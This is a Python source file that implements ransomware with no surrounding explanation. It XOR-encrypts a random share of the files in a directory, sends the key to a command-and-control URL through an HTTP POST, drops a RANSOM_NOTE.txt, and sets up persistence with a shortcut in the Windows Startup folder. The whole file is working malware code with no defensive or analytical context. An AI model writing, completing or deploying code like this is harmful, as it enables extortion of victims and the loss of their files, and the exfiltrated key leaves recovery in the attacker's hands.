import os
import random
import string
import requests
import winreg
import win32com.client

def generate_key(length=16):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        data = file.read()
    encrypted_data = bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(data)])
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

def create_ransom_note(note, directory):
    with open(os.path.join(directory, 'RANSOM_NOTE.txt'), 'w') as file:
        file.write(note)

def create_persistence():
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(os.path.expanduser('~') + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ransomware.lnk')
    shortcut.TargetPath = os.path.abspath(__file__)
    shortcut.Save()

def ransomware_with_random_file_selection(directory: str, note: str, c2_url: str, percentage: float) -> None:
    files = [os.path.join(directory, f) for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]
    num_files_to_encrypt = max(1, int(len(files) * percentage))
    files_to_encrypt = random.sample(files, num_files_to_encrypt)
    
    key = generate_key()
    for file in files_to_encrypt:
        encrypt_file(file, key)
    
    requests.post(c2_url, data={'key': key})
    create_ransom_note(note, directory)
    create_persistence()
